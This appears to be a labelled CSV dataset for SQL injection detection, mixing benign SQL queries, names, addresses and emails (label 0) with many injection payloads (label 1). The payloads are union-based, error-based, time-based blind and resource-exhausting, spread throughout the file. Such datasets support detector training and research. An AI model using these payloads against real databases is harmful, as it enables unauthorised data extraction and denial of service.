Query,Label
" SELECT * FROM memory ORDER BY care, mathematics",0
"plaa adria 152,",0
3.64462E+15,0
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1
"1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1
"c/ francisco javier simonet 7, 11?e",0
-9434'  )   union all select 3106#,1
SELECT limited ( s )  FROM found UNION ALL,0
select name from syscolumns where id   =     (  sele ...,1
"paseo alameda de osuna 10,",0
SELECT * FROM cut,0
7650,0
"-7737'||  (  select 'xalo' where 9219  =  9219 union all select 9219,9219,9219,9219#",1
96174245k,0
end and    (    (   'vkle'  =  'vkle,1
SELECT * FROM glass  WHERE sat = blanket,0
SELECT * FROM orange ORDER BY package DESC,0
SELECT * FROM sharp WHERE lake BETWEEN '1996-07-01' AND '1996-07-31',0
"c/ padre ignacio ellaguria, 117 6-e",0
SELECT * FROM halfway WHERE appropriate = 'noted' FETCH FIRST 3 ROWS ONLY,0
"   SELECT Employees.connected, COUNT ( Orders.grownID )  AS flowerFROM    ( OrdersINNER JOIN middle ON Orders.cityID  =  Employees.remarkableID ) ",0
"1%' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
urea bernat,0
"1'||  (  select 'aoad' where 8795  =  8795 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
SELECT * FROM some,0
silvina,0
wailing@mariposasentudia.je,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
SELECT * FROM  ( SELECT camera FROM chicken ) ,0
"1'  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #",1
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
1'   )    )    as eymg where 7000  =  7000,1
-9340  )   where 5462  =  5462 or 3038  =  3038,1
hendrika@kayaalicante.sc,0
"1' where 1602  =  1602 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
"  SELECT Orders.keyrID, Employees.smile, Employees.managed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.bridgeID ORDER BY Orders.airplaneID",0
SELECT * FROM sweet WHERE living = 'yourself' LIMIT 3,0
maryrose,0
calvin@espaciodelpintor.by,0
palmieri layi,0
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1
"-9829'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT COUNT ( typicalID ) FROM average,0
-8023' in boolean mode  )   order by 1#,1
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1
SELECT * FROM nervous WHERE sign = 'shade',0
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ) ,0
"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
SELECT * FROM simplest WHERE atmosphere = 'tiny'  OR whole = 'military',0
SELECT * FROM never WHERE settle NOT LIKE 'organized%',0
-8264%'  )   order by 1#,1
"1' or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT AVG ( gravity ) FROM fence SELECT SUM ( largest ) ,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
9.74327E+15,0
select   (  case when   (  1407  =  2741  )   then 1407 else 1407*  (  select 1407 from mysql.db  )   end  )  #,1
"1%'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   '%'  =  '",1
SELECT return ( s FROM muscle RIGHT JOIN,0
anglaril,0
SELECT TOP 50 PERCENT * FROM ear SELECT * FROM fog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tribe,0
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""M"" ) ;",0
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",1
"-9854%""   )    )     )   or 6455  =  3652",1
aguilera troule,0
1'  )   as wtev where 5283  =  5283,1
SELECT * FROM anybody FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM kill FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM smooth,0
SELECT orbit ( s )  FROM orange FULL OUTER JOIN,0
"-5109   )    )     )   or make_set  (  6627  =  7331,7331  )   and    (    (     (  9466  =  9466",1
"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",1
select   (  case when   (  7005  =  7118  )   then 1 else 7005*  (  select 7005 from master..sysdatabases  )   end  )  --,1
raysa,0
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",1
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 1 else 0 end  )   limit 1--",1
"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",1
66339533n,0
1'  )   where 5145  =  5145,1
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ) ,0
roca,0
"1""  )   as ifgl where 2190  =  2190 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya",1
-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,1
"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
   )    )    or sleep  (  __TIME__  )    =  ',1
SELECT * FROM she 3 SELECT * FROM further,0
oda,0
"  SELECT shellsID AS ID, nice AS dangerous FROM travel",0
"   SELECT fifth,spirit,travel,color,running     (  (  finger JOIN command ON mouse.bone =  house.entirely )   INNER JOIN lakeON Orders.go =  mysterious.consistID ) ",0
"1 and elt  (  8853  =  1675,1675  )  -- jegm",1
SELECT COUNT ( cake ) FROM porch,0
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,0
46724,0
SELECT TOP 3 * FROM greatest WHERE western = 'brave' SELECT * FROM record,0
eberto,0
"1%'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  '",1
"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",1
SELECT COUNT ( whenever ) FROM sell,0
"1  )   as yduh where 6481  =  6481 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
dehr,0
SELECT fallen ( s )  FROM roll,0
SELECT master FROM jack,0
SELECT year FROM sand,0
SELECT weigh ( s )  FROM pole FULL OUTER JOIN,0
bradshaw.ocallaghan@almascanarias.do,0
SELECT COUNT ( DISTINCT swam )  FROM produce,0
SELECT * FROM expression 3,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",1
SELECT * FROM snake FETCH FIRST 3 ROWS ONLY,0
4742,0
" SELECT * FROM telephone ORDER BY funny, sent",0
SELECT TOP 50 PERCENT * FROM flies,0
SELECT * FROM church WHERE captured NOT BETWEEN 'invented' AND 'fifty',0
ajmet,0
" select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",1
backes@kimkardashian.com.lk,0
17889538t,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT * FROM using WHERE corner BETWEEN 'bill' AND 'off',0
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",1
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT COUNT ( kill )  FROM atomic,0
"-2106"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""dvlq"" like ""dvlq",1
49440,0
7751,0
joffe,0
goertzen,0
barcones,0
"estrecho de ormuz 62, 7-g",0
"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",1
SELECT * FROM thread WHERE    NOT eleven = 'worse',0
"avinguda castellot, 116,",0
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1
42569454l,0
"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",1
1 where 9932  =  9932,1
"1%""   )    )    waitfor delay '0:0:5'--",1
rasmia,0
"  SELECT Orders.distancerID, Employees.said, Employees.sleep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.memoryID ORDER BY Orders.rememberID",0
jaworsky,0
0a0t4d2r,0
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ) ,0
"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",1
SELECT AVG ( Price ) FROM look,0
"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1
"1' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT number ( s )  FROM here FULL OUTER JOIN,0
"   SELECT fly,shoe,city,shinning,claws     (  (  surrounded JOIN find ON electric.alive =  track.scene )   INNER JOIN underON Orders.welcome =  arrangement.campID ) ",0
mao,0
"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",1
6.19E+15,0
-2452'   )    )     )   union all select 1951--,1
SELECT meet ( s FROM steel RIGHT JOIN,0
ha3fila,0
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,1
SELECT lot ( s )  FROM escape,0
SELECT * FROM title WHERE tired = 'luck' FETCH FIRST 3 ROWS ONLY,0
FROM  ( SELECT DISTINCT solar FROM cotton ) ,0
SELECT * FROM Customers GO;  EXEC SelectAllCustomers;,0
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",1
-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1
41850,0
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,1
SELECT mice ( s )  FROM winter,0
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
SELECT TOP 50 PERCENT * FROM product SELECT * FROM lack FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circus,0
SELECT paragraph FROM carry,0
"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",1
" SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ; ",0
1 where 6494  =  6494 and 8463  =  2760,1
-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,1
SELECT * FROM  ( SELECT shake FROM tea ) ,0
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31',0
"alcalde esteban minguez, 169, 12?b",0
"  UPDATE driven SET become =  'given', City =  'whispered' WHERE silence =  pool",0
SELECT * FROM glass ORDER BY now DESC,0
legarreta sant,0
 (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,1
SELECT * FROM speed FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM good WHERE real IN  ( SELECT simply FROM introduced ) ,0
butts@maxtienda.na,0
"1  )   where 5550  =  5550   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
dolores ibarruri 75,0
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",1
alfardilla,0
greear@mcgt.jobs,0
SELECT guide ( s )  FROM baseball SELECT war ( s ) ,0
%7C,1
SELECT TOP 3 * FROM pony WHERE getting = 'life' SELECT * FROM ate,0
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,1
select sleep  (  5  )   and '%'  =  ',1
"-6357""  )   union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",1
yaiti,0
SELECT AVG ( dull ) FROM view SELECT SUM ( unhappy ) ,0
SELECT held FROM even UNION ALL SELECT fresh FROM similar ORDER BY pound,0
SELECT * FROM bell WHERE piano LIKE '%took%',0
solana de los barros,0
SELECT COUNT ( purpleID ) FROM why,0
"1 where 9072  =  9072 and elt  (  4249  =  4249,7259  )  --",1
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",1
d37t30,0
sanou bellsol,0
3023,0
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( DISTINCT swim )  FROM anything,0
selj@ebaz.travel,0
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,1
"calle salvador de madariaga s/n,",0
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda",1
SELECT * FROM meat WHERE slave = 'ask'  OR vertical = 'section',0
invo3unta6i5,0
offers,0
SELECT DISTINCT cannot FROM feature,0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1
SELECT TOP 50 PERCENT * FROM recognize,0
select   (  case when   (  1227  =  4014  )   then 1227 else 1227*  (  select 1227 from mysql.db  )   end  )  #,1
"  SELECT electric AS perhaps, see AS [like]  FROM hill",0
01632755p,0
farid,0
"   SELECT behavior, birds+ ', ' + uncle+ ' ' + create+ ', ' + myself AS home  FROM forgot",0
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1
-5089'   )    )    as icbb where 1129  =  1129 or 6250  =  9650,1
velov@expozaragozafloral2014.ac,0
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'kejy'  =  'kejy",1
SELECT * FROM [Products Above Average Price]; CREATE OR REPLACE VIEW view_name AS,0
kaneko,0
SELECT COUNT ( ill ) FROM thing,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
59973244p,0
SELECT * FROM mighty,0
"c/ secretario guedes aleman s/n,",0
osada,0
1'+  (  select taga where 8036  =  8036,1
"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",1
or 'x'  =  'x,1
anything' or 'x'  =  'x,1
SELECT AVG ( Price ) FROM who,0
5.95675E+15,0
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,1
atilio,0
63171354z,0
gunther@nik.com.tn,0
"  UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe",0
zahira,0
"iif  (  1149  =  4765,1,1/0  )  ",1
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",1
1'+  (  select 'mquh' where 3933  =  3933,1
28%,1
qerimi@graficascamp.bt,0
SELECT COUNT ( baby ) FROM recent,0
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""msjh"" like ""msjh",1
" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
" select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",1
8.996E+15,0
"c/ cartagena, 84 3?b",0
"1',  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   ",1
"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
SELECT * FROM dot WHERE hungry = 'threw',0
"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1
SELECT fix FROM air UNION ALL SELECT national FROM pale ORDER BY cat,0
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",1
SELECT * FROM whatever WHERE writer IN  ( SELECT noise FROM damage ) ,0
"1' and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"1   )    )    union all select null,null,null,null,null,null,null#",1
clarucha,0
"   SELECT COUNT ( seat ) , mental FROM one BY best",0
"gredos, 114 12?g",0
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT AVG ( silk ) FROM coat SELECT SUM ( band ) ,0
brunton9,0
valverde de los arroyos,0
"1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT * FROM difficulty WHERE typical = 'desk' LIMIT 3,0
sowry,0
feutlins,0
SELECT * FROM signal FETCH FIRST 50 PERCENT ROWS ONLY,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
1'   )    )    as pqbq where 1865  =  1865,1
SELECT * FROM end WHERE foot NOT LIKE 'zipper%',0
SELECT * FROM  ( SELECT ancient FROM determine ) ,0
"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT AVG ( late ) FROM vote,0
nooshin,0
"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1
"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without""",0
-3862'  )   or 9323  =  9323#,1
SELECT * FROM explore WHERE with = 'affect' LIMIT 3,0
1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',1
SELECT TOP 50 PERCENT * FROM military SELECT * FROM danger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM language,0
1%'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  '%'  =  ',1
"  SELECT TIMEDIFF ( ""13:10:11"", ""13:10:10"" ) ;",0
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1
bayliss,0
"-5417 or elt  (  1032  =  1032,3623  )  ",1
9.17827E+15,0
horcajo de montemayor,0
50610,0
"1"" or sleep  (  5  )   and ""fbuo"" like ""fbuo",1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
ensaa6o,0
dulcera,0
"   SELECT Employees.almost, COUNT ( Orders.largeID )  AS miceFROM    ( OrdersINNER JOIN powerful ON Orders.dishID  =  Employees.didID ) ",0
-6109 union all select 6784--,1
SELECT * FROM additional WHERE thou = 'not',0
SELECT ate ( s )  FROM avoid,0
SELECT * FROM pile 3,0
"-1722' union all select 1408,1408,1408#",1
in8ros742tiva,0
SELECT * FROM  ( SELECT life FROM probably ) ,0
1 where 6500  =  6500,1
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0
SELECT globe ( s )  FROM shirt UNION ALL,0
" select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",1
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT clearly ( s )  FROM massage SELECT double ( s ) ,0
duffield@telelujo.coop,0
c2nve3e213a,0
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1
1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,1
select   (  case when   (  9434  =  2780  )   then 9434 else 9434*  (  select 9434 from information_schema.character_sets  )   end  )  #,1
SELECT TOP 3 * FROM silly WHERE supper = 'wet' SELECT * FROM bill,0
91553356q,0
"  SELECT * FROM replace WHERE subject IN  ( 'managed', 'past', 'name' )  ",0
SELECT MIN ( teacher )  AS song FROM castle,0
-3598  )   union all select 2264#,1
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
8.65216E+15,0
"pobla tornesa, la",0
12489,0
SELECT * FROM anywhere WHERE one NOT LIKE '[attack]%',0
